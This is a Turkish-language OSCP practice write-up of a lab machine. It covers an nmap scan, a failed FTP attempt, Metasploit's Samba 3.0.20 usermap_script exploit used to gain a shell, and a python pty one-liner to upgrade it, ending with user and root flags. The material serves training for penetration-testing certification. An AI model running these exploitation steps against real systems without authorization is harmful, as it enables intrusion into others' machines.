# OSCP_Preparation

Makine IP: 10.129.86.76 

 Hemen nmap çalıştırıyorum ve bizi neler bekliyor görmek için sabırsızlanıyorum.

```console
Nmap -A 10.129.86.76  
```
 
![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\5.PNG)

https://www.exploit-db.com/exploits/17491 - FTP versiyonunda Command Execution açığı olduğu görülüyor. 

FTP’den girmeyi denedim. 

```console
tcp> open 

(to) 10.129.86.76  
```

![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\6.PNG)


PASV FTP, Dosya Aktarım Protokolü (FTP) bağlantılarını kurmak için alternatif bir moddur. Kısacası, bir FTP istemcisinin gelen bağlantılarını engelleyen güvenlik duvarı sorununu çözmektedir. Pasif FTP, bir güvenlik duvarının arkasındaki FTP istemcileri için tercih edilen bir FTP modudur. 
 
Ftp'den devam edemediğim için samba da ilgili versiyonda açık olup olmadığına bakıyorum. 
 

 
```console
msf6 > search samba 3.0.20 
```

![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\1.PNG)

Command Execution açıklığı olduğunu gördükten sonra exploitimi hazırlamaya başlıyorum.

  
```console
msf6 > use exploit/multi/samba/usermap_script 
```

![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\2.PNG)

 
```console
msf6 exploit(multi/samba/usermap_script) > set RPORT 445 
```
 Burada dikkat edilmesi gereken kısım port. Nmap ile elde ettiğimiz sonucu unutmadan devam ediyoruz.

Ve en sevilen kısım EXPLOİT ! Enter..
```console
msf6 exploit(multi/samba/usermap_script) > exploit 
```
![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\3.PNG)

Başarılı olduk. Şimdi TTY shell alalım işimiz kolay olsun.
  
```console
python -c 'import pty; pty.spawn("/bin/sh")' 
```

![image](C:\Users\90532\Documents\OSCP_github\OSCP_Preparation\Assets\4.PNG)


Hem user hem root flag'ini almış bulunuyoruz :)
 

 

 

